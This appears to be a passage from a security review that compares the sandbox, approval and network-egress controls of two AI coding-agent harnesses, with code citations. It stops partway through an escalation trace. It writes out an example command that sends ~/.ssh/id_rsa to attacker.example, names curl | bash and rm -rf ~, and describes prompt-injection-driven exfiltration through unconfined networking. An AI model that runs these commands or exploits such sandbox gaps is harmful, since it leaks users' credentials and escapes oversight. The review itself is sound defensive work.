# 06 — Sandboxing, Approval Policy, Command Safety, Network Controls

**Axis owner:** safety/approvals subagent
**Subjects**
- **DSH** — `/Users/l33tdawg/nodejs-projects/levelup/.scratch/dsh-src` (TypeScript monorepo, SHA `639ed0153` / `v0.2.0-rc.2`)
- **CODEX** — `/Users/l33tdawg/nodejs-projects/codex` (Rust, SHA `2abb02bc0`)

**Method.** Read-only inspection of both trees. Every claim is tagged `[V]` = VERIFIED (I read the exact line cited) or `[I]` = INFERRED (reasoned from adjacent code/docs, not directly observed). No runtime experiments were performed against either harness — all findings are static.

**Evidence bases actually opened**

| DSH | CODEX |
|---|---|
| `packages/sandbox/sandbox/src/{index,escalation,roots,diagnostics}.ts` | `codex-rs/protocol/src/protocol.rs` |
| `packages/sandbox/sandbox-policy/src/{index,session-mode}.ts` | `codex-rs/sandboxing/src/{seatbelt,bwrap,landlock,denial,manager,lib}.rs` + 4 `.sbpl` files |
| `packages/sandbox/sandbox-local/src/{index,profiles}.ts` | `codex-rs/linux-sandbox/src/{bwrap,landlock,linux_run_main}.rs` |
| `packages/sandbox/sandbox-windows-acl/src/{token,acl,grant,index}.ts` + README | `codex-rs/windows-sandbox-rs/src/{token,lib}.rs`, `src/bin/setup_main/win/{firewall,sandbox_users}.rs` |
| `packages/interaction/user-approval/src/{index,types}.ts` | `codex-rs/execpolicy/src/{decision,parser,rule}.rs` + `README.md` |
| `packages/interaction/permission-presets/src/index.ts` | `codex-rs/core/src/exec_policy.rs` |
| `packages/core/tools/src/index.ts` (pre-execute gate, `serviceAsk`) | `codex-rs/core/src/tools/{sandboxing,orchestrator,approvals,network_approval}.rs` |
| `packages/shell/tool-bash/src/{index,render,background}.ts`, `packages/shell/bash-sandbox/src/index.ts` | `codex-rs/network-proxy/src/{proxy,runtime,policy,network_policy,config}.rs` |
| `packages/guard/repeat-tool-reminder/src/index.ts`, `packages/guard/timeout-policy/src/index.ts` | `codex-rs/core/src/safety.rs`, `codex-rs/core/src/guardian/*` |
| `packages/hooks/hook-protocol/src/{types,merge,matcher}.ts`, `hooks-claude-code/src/index.ts`, `hooks-codex/src/index.ts` | `codex-rs/prompts/templates/permissions/**` |
| `packages/bundle/base/cordis.patch.yml`, `docs`, `packages/sandbox/*/README.md` | `codex-rs/core/src/guardian/policy.md`, `codex-rs/shell-command/src/command_safety/is_dangerous_command.rs` |

---

## 0. Executive verdict

**Codex is materially stronger on this axis — by a wide margin on three of the five sub-axes, and narrowly on a fourth.**

Codex controls **network egress at the OS layer on all three platforms**, ships a **real command policy language** (Starlark `prefix_rule` / `network_rule` / `host_executable` with `allow|prompt|forbidden`), maintains **session- and prefix-scoped approval caches**, runs a **harness-driven sandbox-denial → approve → retry-outside-sandbox loop**, and gates risky actions with an **LLM guardian reviewer**. DSH has *none* of those five things.

DSH is stronger on **fail-closed honesty**: it refuses to run unconfined when no backend is usable (`SANDBOX_UNAVAILABLE`), reports enforcement completeness as a first-class `full | partial` value, has a **closed, strictly-wider escalation ladder** with a mandatory justification pairing, and keeps a **turn-enclosed durable approval audit pair** in the session log. Those are real design wins — but they are wins about *telling the truth about a narrow boundary*, not about *how much boundary exists*.

The single most important finding on the DSH side:

> **DSH's sandbox has no network dimension at all.** `SandboxMode` is explicitly file-effects-only (`packages/sandbox/sandbox/src/index.ts:24-30`, `:167`), the macOS Seatbelt profile is `(allow default)` + `(deny file-write*)` only (`packages/sandbox/sandbox-local/src/profiles.ts:52`), the Linux bwrap profile never passes `--unshare-net` (`packages/sandbox/sandbox-local/src/profiles.ts:17`), and Landlock grants are file-only `--ro`/`--rw` (`native/system/packages/entry/src/index.ts:94-99`). **A `read-only` DSH session on macOS or Linux can `curl -d @$HOME/.ssh/id_rsa https://attacker.example` and succeed.** `[V]`

The single most important finding on the Codex side:

> Codex's default read-only/workspace-write policies mean **no network** (`network_access: false` by default — `codex-rs/protocol/src/protocol.rs:1059-1062`, `:1083-1086`), and that is enforced *three different ways* depending on platform: Seatbelt deny-by-default with only loopback-proxy ports opened (`codex-rs/sandboxing/src/seatbelt.rs:307-369`), `bwrap --unshare-net` plus a seccomp filter denying `connect`/`socket`/`sendto`/… (`codex-rs/linux-sandbox/src/bwrap.rs:288-290`, `codex-rs/linux-sandbox/src/landlock.rs:186-217`), and Windows Firewall block rules scoped to a dedicated sandbox user (`codex-rs/windows-sandbox-rs/src/bin/setup_main/win/firewall.rs:32-43`). On top of that, an HTTP/HTTPS/SOCKS MITM proxy with a **domain allowlist** mediates anything that *is* allowed (`codex-rs/network-proxy/src/runtime.rs:555-616`). `[V]`

---

## 1. Table — enforcement mechanism per platform per harness

### 1a. Filesystem

| Platform | DSH mechanism | DSH strength | CODEX mechanism | CODEX strength |
|---|---|---|---|---|
| **macOS** | `sandbox-exec -p <SBPL>`; profile = `(version 1) (allow default) (deny file-write*) (allow file-write* (literal "/dev/null")) (allow file-write* (subpath <roots>))` — `packages/sandbox/sandbox-local/src/profiles.ts:51-58`. Writable roots = canonical `{workspaceRoot, /tmp, tmpdir()}` — `packages/sandbox/sandbox/src/roots.ts:52-55`. **Reads unrestricted; `(allow default)` leaves everything except `file-write*` permitted.** `[V]` | Write-only fence. `read-only` ⇒ nothing writable but `/dev/null`. Selection is by-platform-then-probe; darwin has one rung, so **no probe runs** — a broken `sandbox-exec` fails at execution time via the `sandbox-exec: ` stderr signature (`sandbox-local/src/index.ts:160-167`, `:240`). `[V]` | `sandbox-exec -p` with a composed SBPL: `seatbelt_base_policy.sbpl` starts `(deny default)` (`:8`) and enumerates `process-exec`, `process-fork`, `signal`, `process-info*`, a sysctl allowlist, iokit, mach-lookups, pty/`/dev` rules. Then `seatbelt_preferences_policy.sbpl` is added only when reads are unrestricted (`:1-2`), plus per-root read/write grants and `restricted_read_only_platform_defaults.sbpl` for `:minimal` split policies. `[V]` — `codex-rs/sandboxing/src/seatbelt.rs:295-369`, `seatbelt_base_policy.sbpl:8-116`, `restricted_read_only_platform_defaults.sbpl:1-189` | **Deny-by-default**: no read of a path outside the granted roots, no mach lookup outside the enumerated list, no ioctl outside the pty list. Also honors **unreadable-subpath carve-outs** and **protected metadata names** (`.git`, `.codex` — `protocol.rs:1101-1152`). Strictly stronger. |
| **Linux** | Chain is `['bwrap', 'landlock']`, probed in order (`sandbox-local/src/index.ts:160-167`). bwrap: `--ro-bind / / --dev /dev --unshare-pid --proc /proc --die-with-parent`, plus `--tmpfs /tmp` and `--bind <workspaceRoot> <workspaceRoot>` under `workspace-write` (`profiles.ts:16-23`). Landlock launcher: `--ro /` and `--rw /dev/null[,/tmp,<workspaceRoot>]` (`profiles.ts:30-36`, `native/system/packages/entry/src/index.ts:94-99`). `[V]` | Mount-view read-only bind + Landlock path-beneath grants. Note `read-only` gets **no `/tmp` tmpfs**, so `/tmp` is read-only (`[V]` from `profiles.ts:19-20` placement inside the `workspace-write` branch). | bwrap is the default filesystem sandbox; Landlock is retained as a legacy/backup path (`codex-rs/linux-sandbox/src/landlock.rs:1-4`). bwrap args: `--new-session --die-with-parent --bind / / \| --ro-bind / / \| --tmpfs / + scoped --ro-bind` (depending on read policy), `--dev /dev`, `--bind-try /dev/shm`, `--unshare-user --unshare-pid --unshare-ipc [--unshare-net] [--proc /proc] --cap-drop ALL` — `codex-rs/linux-sandbox/src/bwrap.rs:268-298`, with an explicit documented mount ordering for unreadable-glob masking and read-only carve-outs (`bwrap.rs:365-380`). Legacy Landlock uses `ABI::V5`, `AccessFs::from_all` / `from_read`, `CompatLevel::BestEffort`, `set_no_new_privs(true)` (`linux-sandbox/src/landlock.rs:140-156`), and **refuses** restricted read-only rather than silently downgrading (`:71-77`). `[V]` | Stronger: read *and* write policy, `--cap-drop ALL`, PID/IPC/user namespaces, unreadable-glob masking, and an explicit fail on unsupported policy shapes. |
| **Windows** | Node.js runner (`lib/runner.js`) invoked as an argv prefix (`sandbox-local/src/index.ts:369-388`, `:571-580`). It calls `CreateRestrictedToken` with `DISABLE_MAX_PRIVILEGE \| LUA_TOKEN \| WRITE_RESTRICTED` (`sandbox-windows-acl/src/token.ts:232`), then lowers the token to **Low integrity** (`S-1-16-4096`, `token.ts:148-163`). Each grant writes three things in one `SetNamedSecurityInfoW` call: a capability-SID allow ACE, a **deny of `FILE_DELETE_CHILD` to World**, and an inheritable Low mandatory label (`sandbox-windows-acl/src/acl.ts:10-15`, README:98). `[V]` | Declared **`partial`** enforcement — `STATIC_ENFORCEMENT['windows-acl'] = 'partial'` (`sandbox-local/src/index.ts:188`). Reads unconfined; network unconfined; NTFS hard links alias across the boundary; a tree ACL'd by another AppContainer tool is unreadable (`sandbox-windows-acl/README.md:125`, `:188`). Also: piped stdio is impossible for confined grandchildren (`README.md:186`). `[V]` | `WindowsSandboxLevel::{Disabled, RestrictedToken, Elevated}` (`protocol.rs`/`config_types.rs:297-302`). Elevated level provisions **dedicated local Windows user accounts** in a `CodexSandboxUsers` group (`bin/setup_main/win/sandbox_users.rs:54`, `:70-115`) plus **Windows Firewall rules** named `codex_sandbox_offline_block_outbound` / `_block_loopback_tcp` / `_block_loopback_udp` with an allow exception only for the loopback proxy port (`bin/setup_main/win/firewall.rs:32-43`). `[V]` | Stronger *when Elevated setup has run*: OS-account-level isolation + firewall-based network denial. At the `RestrictedToken` level the two are comparable, with Codex adding the firewall path. |
| **Other/unknown** | `PLATFORM_CHAINS[platform] ?? []` ⇒ no chain ⇒ `SandboxUnavailableError`, command **never runs** (`sandbox-local/src/index.ts:511`, `:513`, `:505`). `[V]` | Fail-closed. | `get_platform_sandbox` returns `None` ⇒ `SandboxType::None` (`sandboxing/src/manager.rs:62-76`). `should_sandbox` still returns `true` for a restricted profile (`manager.rs:314-333`), which `SandboxAttempt::is_escalated()` interprets as "running outside a required sandbox" (`core/src/tools/sandboxing.rs:423-430`). `[I]` — the command runs unsandboxed, with the escalation surfaced in telemetry rather than a hard refusal. | **DSH is stronger here**: it hard-refuses. This is a genuine DSH win. |

#### Side-finding: DSH's `/tmp` semantics diverge across backends `[V]`

Under `workspace-write`, bwrap mounts a **fresh `--tmpfs /tmp`** (`sandbox-local/src/profiles.ts:19`), which *hides the host `/tmp`* and is discarded when the command exits. Landlock instead grants `--rw /tmp` on the real host directory (`profiles.ts:33`), and Seatbelt grants a `file-write*` subpath on the canonical `/private/tmp` (`profiles.ts:54` + `roots.ts:52-55`). Consequence: on Linux+bwrap, a two-step workflow where command 1 writes `$TMPDIR` and command 2 reads it **fails**; on macOS/Landlock/Windows the same workflow succeeds. `roots.ts:9-11` acknowledges this ("an ephemeral `/tmp` mount, launcher-owned flags — the honest per-runner differences recorded in the sandbox RFC — with parity pinned by test"). Stronger isolation, but a real cross-platform behavioral inconsistency that will read to users as a flaky sandbox.

### 1b. Network and process isolation

| Dimension | DSH | CODEX |
|---|---|---|
| Network at OS layer | **None.** `SandboxMode` doc: "FILE effects only — network and process visibility are not claimed" (`sandbox/src/index.ts:24-30`; restated `:167`; `sandbox-policy/README.md:148`; RFC `.agents/notes/implemented/feature/2026-07-06-sandbox.md:196`). No `--unshare-net` (`profiles.ts:17`). No network clause in the SBPL profile (`profiles.ts:52`). Landlock grants are `--ro`/`--rw` only. `[V]` | **Denied by default** on all platforms; when enabled, restricted to a proxy. `[V]` — `protocol.rs:1059-1062`, `:1083-1086`; `seatbelt.rs:307-369`; `linux-sandbox/src/bwrap.rs:288-290` + `landlock.rs:186-217`; `firewall.rs:32-43` |
| Network policy layer | **None.** Repo-wide grep for `unshare-net`, `deny network`, `network_access`, `networkAccess` across `packages/**/*.ts` returns **zero** hits. `[V]` | Domain allowlist/denylist globsets + MITM proxy + per-host approval + per-host session cache + persisted `network_rule` amendments. `[V]` — `network-proxy/src/runtime.rs:555-616`, `network-proxy/src/policy.rs:172-235`, `core/src/tools/network_approval.rs:640-770`, `execpolicy/src/rule.rs:149-154` |
| Process isolation | bwrap adds `--unshare-pid` + private `/proc` on Linux (deliberate: host `/proc/<pid>` magic links would otherwise bypass file confinement). Landlock and Seatbelt leave process visibility unchanged. `[V]` | bwrap `--unshare-user --unshare-pid --unshare-ipc --cap-drop ALL`; seccomp additionally denies `ptrace`, `process_vm_readv/writev`, `io_uring_*` unconditionally. `[V]` — `linux-sandbox/src/bwrap.rs:284-296`, `landlock.rs:179-184` |
| Credential isolation | None found. `[I]` — no credential-scoping knob in any sandbox package; the only mention of credentials is the DSH shell executor's "credential scrub" for hooks, which is env hygiene, not a boundary (see §6). | Credential broker + `credential_broker` module inside the proxy; `BROKERED_CREDENTIALS_ENV_KEY` injected into proxied children. `[V]` — `network-proxy/src/proxy.rs:577-580`, `credential_broker.rs:1-607` |

---

## 2. Does DSH have a *policy language* for commands?

### Answer: **No.** It has (a) three coarse file-effect modes, (b) a strictly-wider escalation ladder, and (c) an *external-process* hook bridge that can express per-tool allow/deny/ask. It has nothing resembling `execpolicy`.

**What DSH has — the complete inventory `[V]`:**

1. **Three file-effect modes.** `export type SandboxMode = 'read-only' | 'workspace-write' | 'danger-full-access'` — `packages/sandbox/sandbox/src/index.ts:30`. Deployment default `read-only` (`sandbox-policy/src/index.ts:113`), shipped bundle default `workspace-write` (`packages/bundle/base/cordis.patch.yml:232`).
2. **Two approval policies.** `export type ApprovalPolicy = 'ask' | 'never'` — `interaction/user-approval/src/index.ts:67`. That is the whole axis. There is no `untrusted`, no `on-failure`, no granular toggles.
3. **A closed escalation ladder.** `WIDER_MODES = {'read-only': ['workspace-write','danger-full-access'], 'workspace-write': ['danger-full-access']}` — `sandbox/src/escalation.ts:28-31`. Advertised target vocabulary `ESCALATION_TARGETS = ['workspace-write','danger-full-access']` (`:41`). Checked at **execution**, not in the schema (`:174-179`).
4. **A hook bridge with per-tool decisions.** `hook-protocol/src/types.ts:119` normalizes `permissionDecision` ∈ `{allow, deny, ask}` plus legacy `{approve, block}`; `merge.ts:3` documents the fold as **`deny > ask > allow`**; `matcher.ts:57-64` matches a regex (or a Claude-style literal `a|b|c`) against the **tool name only** (`hooks-claude-code/src/index.ts:243-248` — "Matcher subject is the tool name").
5. Hook decisions **do** route into the approval service: `hooks-claude-code/src/index.ts:248` returns `{kind:'ask', reason}` → `PreToolDecision` (`core/tools/src/index.ts:611`) → `serviceAsk` (`core/tools/src/index.ts:1717-1765`) → `ctx.approval.request(...)`. The Codex dialect bridge intentionally honors only `deny` (`hooks-codex/src/index.ts:230` — "Codex blocks only (no allow/ask honored)").

**What DSH does *not* have — searched and not found `[V]`:**

| Capability | Codex | DSH |
|---|---|---|
| Rule file language | Starlark (`AstModule::parse` with `Dialect::Extended`, `parser.rs:57-79`) | — |
| Rule predicates | `prefix_rule(pattern=[...], decision, justification, match, not_match)`, `host_executable(name, paths)` (`execpolicy/README.md:1-60`) | — |
| Verdicts | `Allow` / `Prompt` / `Forbidden` (`execpolicy/src/decision.rs:9-16`) | — |
| Match-time unit tests | `match` / `not_match` examples validated at **load** (`parser.rs:75-77`, `rule.rs:35-36`) | — |
| Command tokenization | `shlex`-based, with `bash -lc` / `powershell -Command` lowering (`core/src/exec_policy.rs:835-841`, `commands_for_exec_policy`) | — |
| Segment splitting | splits on `|`, `&&`, `||`, `;`, subshells; each segment evaluated independently (`prompts/templates/permissions/approval_policy/on_request.md:3-19`) | — |
| Dangerous-command heuristics | `DangerousCommandMatch::{ForcedRm, Other}` (`shell-command/src/command_safety/is_dangerous_command.rs:8-14`), wrapper-depth-unwrapping through `sudo`/`env`/`trap`/shell scripts (`:23-53`, `:96-121`) | — |
| Banned-prefix suggestion list | 88 shell/interpreter prefixes (`core/src/exec_policy.rs:56-145`) | — |
| Rule persistence | `blocking_append_allow_prefix_rule` writes `$CODEX_HOME/rules/default.rules` (`core/src/exec_policy.rs:461-466`, `:831-833`) | — |
| Config-layered rule dirs | `layers_low_to_high()` × `config_folder()/rules/*.rules` (`core/src/exec_policy.rs:645-698`) | — |

Repo-wide greps for `execpolicy`, `starlark`, `allowlist`, `denylist`, `banned` across DSH `packages/**/*.ts` returned no policy-language implementation — only unrelated hits (a markdown highlighter, a config-form widget, a test-support fixture). `[V]`

### What the absence *costs* in real use

The framing "users get prompted for safe read-only commands" is **not** the right cost model for DSH, and I want to be precise here because the naive comparison is wrong:

- **Under DSH's shipped default, `ls`, `cat`, `git status`, `grep` never prompt.** There is no pre-execute gate for them at all; the only `ask` producers in the tree are the experimental auto-review plugin (`packages/experimental/auto-review/src/index.ts:660`) and the Claude-Code hook bridge (`hooks-claude-code/src/index.ts:248`). `[V]`
- **Under Codex's default `on-request` + a Restricted sandbox, they also never prompt** — `render_decision_for_unmatched_command` returns `Decision::Allow` for a non-dangerous, non-override-requesting command in a restricted sandbox (`core/src/exec_policy.rs:792-801`). `[V]`
- So **on prompt count for safe commands, DSH ≈ Codex ≈ 0** at defaults. DSH only looks cheaper because it has no `untrusted` mode to be expensive in — and that is a *capability gap, not a saving*.

The real costs of having no policy language are these four:

1. **No way to allowlist a command that needs to escape the sandbox — so every escape re-prompts.** The escalation grant is explicitly one-shot: `ApprovalOutcome` is `'allowed-once' | 'rejected' | 'cancelled' | 'unavailable'` (`user-approval/src/types.ts:32`, "a one-shot grant"), and `approveEscalation` only skips the prompt when the requested mode **equals the call's effective mode** (`sandbox/src/escalation.ts:173`). There is no session cache, no prefix rule, no "always allow this command". A workflow needing 6 out-of-workspace writes = **6 prompts + 6 extra model turns** (one wasted turn per denial, because the model must re-issue the call — see §5). The Codex equivalent is **1 prompt** whose "don't ask again for commands that start with `X`" option persists a rule to disk. `[V]`
2. **No intermediate rung.** DSH's only widening from `workspace-write` is `danger-full-access` (`escalation.ts:30`) — i.e. the user is asked to drop *all* sandboxing to write one file outside the tree. Codex has `WithAdditionalPermissions` (per-command `network.enabled`, `file_system.read[]`, `file_system.write[]`) that widens *inside* the sandbox (`protocol.rs`/`models.rs:54-63`; `prompts/templates/permissions/approval_policy/on_request_rule_request_permission.md:5-16`). The DSH user's only choices are "no" and "yes, unrestricted". `[V]`
3. **No way to deny a dangerous command.** `rm -rf ~` under DSH's `danger-full-access` preset is not examined by anything. Codex returns `Forbidden` for a `prefix_rule(decision="forbidden")` match (`exec_policy.rs:380-390`) and prompts for a heuristic `DangerousCommandMatch` even under `Never`… no — under `Never` a dangerous match is `Forbidden` (`exec_policy.rs:765-770`). `[V]`
4. **No audit-driven tightening.** Codex's rules are files on disk, layered (requirement policy > project > user), reviewable and diffable. DSH's only comparable surface is an external hook program. `[I]`

---

## 3. Approval UX

### 3.1 Prompt counts per typical coding session

| Scenario | DSH (`workspace-write` + `ask`, shipped default) | CODEX (`on-request`, `workspace-write`, network off — the default) |
|---|---|---|
| Safe read-only commands (`ls`, `cat`, `git status`, `grep`) | 0 | 0 — `exec_policy.rs:792-801` `[V]` |
| In-workspace writes / builds / tests | 0 | 0 |
| First command denied by the sandbox | **1 prompt, and it costs one extra model turn** (denial → model re-issues with `sandbox_permissions`) — `render.ts` pushes the hint marker, `tool-bash/src/index.ts:393-405` `[V]` | **1 prompt, no extra turn** — the orchestrator catches `SandboxErr::Denied` and prompts in-band (`orchestrator.rs:318-437`), reason string `"command failed; retry without sandbox?"` (`orchestrator.rs:542-546`) `[V]` |
| N subsequent commands denied the same way | **N more prompts** (no cache, one-shot grants) `[V]` | **0** if the user chose "don't ask again for commands that start with `X`" (prefix rule persisted) or "don't ask again for this command in this session" (`ApprovalStore`, `tools/sandboxing.rs:40-116`) `[V]` |
| New network host | **0 prompts — and no block** (network is unconfined) `[V]` | **1 prompt per host**, reason `"<host> is not in the allowed_domains"` (`network_approval.rs:649`), with "allow this host for this conversation" / "allow this host in the future" options (`approval_overlay.rs:869`, `:885`) `[V]` |
| Broken sandbox backend | **1 hard failure**, `SANDBOX_UNAVAILABLE`, command never runs, no prompt (`sandbox/src/index.ts:132-145`) `[V]` | Runs unsandboxed at `SandboxType::None`; escalation is telemetry, not a user decision `[I]` |

**Net:** at default settings both are quiet. Codex becomes *louder* than DSH only when the user opts into `untrusted` (where `render_decision_for_unmatched_command` returns `Prompt` for every unmatched command — `exec_policy.rs:779-783`) or enables the network proxy. DSH becomes louder than Codex exactly in the repeated-escalation case, because it cannot remember anything.

### 3.2 The decision the user is actually asked to make

**DSH — one decision shape, two outcomes.** The prompt text is generated in `approveEscalation`:

```
reason:        "escalate sandbox to <mode>: <justification>"
displayReason: "Allow this operation with <mode> permissions: <justification>"
```
`packages/sandbox/sandbox/src/escalation.ts:192-196` `[V]`

Outcomes are the closed four (`allowed-once` / `rejected` / `cancelled` / `unavailable`) and the rejection message is unusually good: `"the user rejected escalating this command to \"<mode>\"; it stays denied, so stop and explain instead of working around it"` (`escalation.ts:203`). `[V]`

Two structural properties DSH gets right:
- **Justification is mandatory and paired.** `validateEscalationArgs` throws if `sandbox_permissions` is present without `justification`, if `justification` is present without `sandbox_permissions`, or if the justification trims to empty (`escalation.ts:51-61`). A prompt can never appear without a reason. `[V]`
- **The model is told the prompt asks the user**, in-band, at the decision point: `"[sandbox: escalation available — retry this exact command once with sandbox_permissions (the narrowest wider mode that suffices) + justification; the approval prompt asks the user]"` (`escalation.ts:84-86`, rendered at `tool-bash/src/render.ts`). `[V]`

**CODEX — five-to-six decision shapes, each with a durable-persistence variant.** The TUI option labels (`tui/src/bottom_pane/approval_overlay.rs:829-915`) `[V]`:

| Option label | Decision |
|---|---|
| `Yes, proceed` (or `Yes, just this once` when a network approval is in flight) | `Approved` |
| ``Yes, and don't ask again for commands that start with `X` `` | `ApprovedExecpolicyAmendment` → appended to `default.rules` |
| `Yes, and don't ask again for this command in this session` / `Yes, and allow this host for this conversation` / `Yes, and allow these permissions for this session` | `ApprovedForSession` |
| `Yes, and allow this host in the future` | `NetworkPolicyAmendment { Allow }` |
| `No, and block this host in the future` | `NetworkPolicyAmendment { Deny }` |
| `No, continue without running it` | `Denied` |
| `No, and tell Codex what to do differently` | `Abort` |

The prompt body is the *denial reason*, and it is terse and stable by design: `build_denial_reason_from_output` returns the literal `"command failed; retry without sandbox?"` with a comment saying it is kept terse "for UX/tests" (`orchestrator.rs:542-546`). `[V]`

**The qualitative difference.** DSH asks one question: *"widen this call — yes or no?"* — a binary gate on a boundary the user already chose. Codex asks *"widen this call, and if so, should this become a standing rule, and at what scope (this call / this session / this prefix / this host / forever)?"* — which converts each prompt into a **policy-authoring decision**. That is more cognitive load per prompt and far less total load across a session. It is also the mechanism by which Codex sessions trend toward zero prompts while DSH sessions stay at a constant prompt rate.

---

## 4. Network

### DSH: absent, and explicitly so

- `SandboxMode`'s own doc comment: *"Network and process visibility are outside this vocabulary."* — `packages/sandbox/sandbox/src/index.ts:27-28`. `[V]`
- Package README: *"File effects are the whole policy vocabulary — the seam expresses no network, process, syscall, device, or credential restrictions."* — `packages/sandbox/sandbox/README.md:167`. `[V]`
- RFC: *"Does the sandbox restrict network or process visibility? `SandboxMode` claims FILE effects only, and no backend claims network. … Whether network restriction becomes its own knob is left open."* — `.agents/notes/implemented/feature/2026-07-06-sandbox.md:196`. `[V]`
- Cross-family RFC explicitly names the reason it was deferred: *"a web-only network knob while bash `curl` runs free would be a false boundary. Revisit when a bash backend enforces network (bwrap `--unshare-net`, Landlock ABI v4+)."* — `.agents/notes/implemented/feature/2026-07-14-cross-family-fs-sandbox.md:56`. `[V]`
- Windows README: *"Writes and deletes are restricted; reads, network, and process visibility are not … a confined child can … open sockets."* — `packages/sandbox/sandbox-windows-acl/README.md:125`. `[V]`

**The security consequence.** In `read-only` and `workspace-write` on macOS and Linux:
- `curl`, `wget`, `git push`, `npm publish`, `ssh`, raw sockets — all fully permitted. `[V]` (from the profiles: `(allow default)` with only `file-write*` denied; bwrap with no `--unshare-net`).
- Reads are also unrestricted on every DSH backend, so the classic exfil chain `curl -X POST --data-binary @$HOME/.ssh/id_rsa https://attacker.example` is *not blocked at any layer*. `[V]`
- Prompt-injection-driven exfiltration therefore has **no** harness-level obstacle in a confined DSH session. `[I]` — direct consequence of the above.

The DSH maintainers know this (the RFCs say so plainly), so this is a *deliberate scope boundary*, not a bug. But it must be scored as a gap, because Codex closed it.

### CODEX: layered, default-deny, with an allowlist proxy

1. **Default is off.** `SandboxPolicy::ReadOnly { network_access: bool }` and `WorkspaceWrite { …, network_access: bool }` both `#[serde(default)]` to `false`; `new_read_only_policy()` and `new_workspace_write_policy()` both set `network_access: false` (`protocol.rs:1056-1098`, `:1183-1199`). `has_full_network_access()` is the single read point (`:1214-1221`). `[V]`
2. **macOS.** `seatbelt_base_policy.sbpl` begins `(deny default)` (`:8`), so `network-outbound`/`network-inbound` are denied unless added. `dynamic_network_policy_for_network` (`sandboxing/src/seatbelt.rs:307-369`) then emits:
   - restricted path (any proxy ports, any proxy env, managed network, or unix-socket access): loopback bind/inbound/outbound, `remote ip "*:53"` for DNS only when local binding is on, and one `(allow network-outbound (remote ip "localhost:<port>"))` per proxy port, plus the unix-socket rules and `seatbelt_network_policy.sbpl` (`:320-342`);
   - **fail-closed**: proxy config present but no inferrable loopback port ⇒ `return String::new()` — **no network rules at all** (`:345-349`); managed network active with no usable proxy ⇒ same (`:351-355`);
   - only when network is enabled *and* no proxy env exists does it emit the blanket `(allow network-outbound)\n(allow network-inbound)\n` (`:357-365`). `[V]`
3. **Linux.** Two independent layers: `--unshare-net` inside bwrap when `options.network_mode.should_unshare_network()` (`linux-sandbox/src/bwrap.rs:288-290`), plus a seccomp filter installed on the sandboxed thread that EPERMs `connect`, `accept`, `accept4`, `bind`, `listen`, `getpeername`, `getsockname`, `shutdown`, `sendto`, `sendmmsg`, `recvmmsg`, `getsockopt`, `setsockopt`, and `socket`/`socketpair` for any family except `AF_UNIX` (`linux-sandbox/src/landlock.rs:186-217`). A `ProxyRouted` mode instead permits `AF_INET`/`AF_INET6` `socket()` (to reach the local bridge) but denies `socketpair` beyond `AF_UNIX` (`:218-247`). `prctl(PR_SET_NO_NEW_PRIVS)` gating is explicit and commented (`:57-65`, `:119-126`). `[V]`
4. **Windows.** Firewall block rules (`codex_sandbox_offline_block_outbound`, `_block_loopback_tcp`, `_block_loopback_udp`) scoped by SID to a provisioned sandbox user, with a loopback allow rule for the proxy (`bin/setup_main/win/firewall.rs:32-43`, `:392-…` `configure_rule_network_scope`). `[V]`
5. **The proxy itself.** A local HTTP/HTTPS/SOCKS5 MITM proxy (`network-proxy/src/{proxy,http_proxy,socks5,mitm}.rs`) injected into the child through 16 proxy env keys — `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NPM_CONFIG_PROXY`, `PIP_PROXY`, `BUNDLE_HTTP_PROXY`, … (`proxy.rs:546-563`), plus `CODEX_NETWORK_PROXY_ACTIVE`, `CODEX_NETWORK_ALLOW_LOCAL_BINDING`, `ELECTRON_GET_USE_PROXY`, `NODE_USE_ENV_PROXY`. `[V]`
6. **Decision order** in `HostBlockDecision` (`runtime.rs:555-616`): (1) explicit denylist always wins; (2) local/private addresses are opt-in and defended against DNS rebinding by a **DNS + IP-classification check before allowing** (`:571-608`, with `is_non_public_ip`, `is_loopback_host`); (3) the allowlist is enforced when configured. `[V]`
7. **Per-host approval with persistence.** A blocked host triggers `ApprovalAction::NetworkAccess`, reason `"<host> is not in the allowed_domains"`, denial message `"Network access to \"<target>\" was blocked by policy."`, and the user may persist an allow/deny `NetworkPolicyAmendment` for that host (`core/src/tools/network_approval.rs:646-770`; label wording at `approval_overlay.rs:869`, `:885`, `:889`). Session-approved hosts are cached (`session_approved_hosts`, `network_approval.rs:640-644`) and synced to child sessions (`:382`). `[V]`
8. **Sensible hardening details**: relative `allow_unix_sockets` entries are rejected (`config.rs:939-951`); the proxy binds loopback-only when unix sockets are enabled ("clamping HTTP proxy to loopback", `config.rs:374-383`); `network_rule(host, protocol, decision, justification)` extends the *policy language itself* to hosts (`execpolicy/src/rule.rs:149-154`). `[V]`

### Is it a real gap in DSH?

**Yes — the largest gap on this axis.** Concretely:

| Consequence | Assessment |
|---|---|
| Confined DSH sessions can exfiltrate any readable file | **Real.** No layer intervenes. `[V]` |
| Confined DSH sessions can install/execute remote code (`curl \| bash`) | **Real.** `[V]` |
| A "read-only" DSH session is not a confidentiality boundary — only an integrity boundary | **Real.** Reads are unrestricted on *every* DSH backend, including Windows. `[V]` |
| Prompt injection in fetched content can trigger egress | **Real**, and there is no approval prompt to intercept it. `[I]` |
| Is it *surprising* to users? | **Probably yes.** "read-only" reads to most users as "cannot change things and cannot phone home"; DSH's own model-facing sentence is careful ("Any available operation enforced by the DSH file sandbox cannot modify files"), so the *model* is told the truth (`sandbox-policy/src/index.ts:45`) but the *human* preset description is `"Write inside the workspace and permitted temporary directories; wider retries require approval."` (`permission-presets/src/index.ts:191`) — silent on network. `[V]` |

The mitigations that exist are honest but partial: the `danger-full-access` preset is paired with `never` approval (`permission-presets/src/index.ts:193-196`), which at least means the "no prompts" mode is the one that is also unconfined — so users who want prompts keep the narrow file boundary. That does not address network.

---

## 5. Escalation path when a sandboxed command fails

### DSH — **model-driven, two turns, explicit**

```
turn N:   bash("npm install -g foo")
          → kernel refuses (EROFS/EACCES/EPERM)
          → classifyDenial() matches the backend's denialSignatures
             (bwrap: "read-only file system"; landlock: "permission denied";
              seatbelt: "operation not permitted"; windows-acl: 4 signatures)
             — sandbox-local/src/index.ts:207-215, bash-sandbox/src/index.ts:124
               (classification helper: bash-sandbox/src/helpers.ts, imported :27)
          → result text gains:
             "[sandbox: file access denied under workspace-write mode]"
             "[sandbox: escalation available — retry this exact command once with
               sandbox_permissions (the narrowest wider mode that suffices) +
               justification; the approval prompt asks the user]"
             — tool-bash/src/render.ts:46-50 (renderResult) / :110-116 (renderJobRead)
          → exit code non-zero; the command genuinely failed.
turn N+1: bash("npm install -g foo", sandbox_permissions="danger-full-access",
               justification="…")
          → approveBashEscalation() → approveEscalation()
